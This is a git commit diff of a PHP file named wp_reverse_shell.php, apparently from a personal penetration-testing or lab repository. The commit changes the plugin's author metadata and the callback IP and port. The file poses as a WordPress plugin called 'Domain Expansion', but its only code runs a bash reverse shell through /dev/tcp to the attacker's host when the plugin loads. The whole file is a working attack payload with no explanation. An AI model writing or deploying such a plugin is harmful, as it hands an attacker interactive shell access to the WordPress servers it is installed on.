c2c9bcdc080ec630d3fc3375163aa0d222a5283c
violin-ing <eugenekhy@gmail.com>
2025-03-03 11:20:20 -0500

    poop

--- scripts/wp_reverse_shell.php
+++ scripts/wp_reverse_shell.php
@@ -1,15 +1,15 @@
 <?php
 /**
 * Plugin Name: Domain Expansion
-* Plugin URI: https://x.com/dognamedlepton
+* Plugin URI: https://x.com/dumbangrydog
 * Description: Domain Expansion
 * Version: 1.0
-* Author: jckhmr
-* Author URI: https://x.com/dognamedlepton
+* Author: lepton
+* Author URI: https://x.com/dumbangrydog
 * License: https://nosuchlicense
 */
 
-$HOST = '192.168.45.232';
-$PORT = '8989';
+$HOST = '192.168.45.238';
+$PORT = '4444';
 exec("/bin/bash -c 'bash -i >& /dev/tcp/$HOST/$PORT 0>&1'");
 ?>
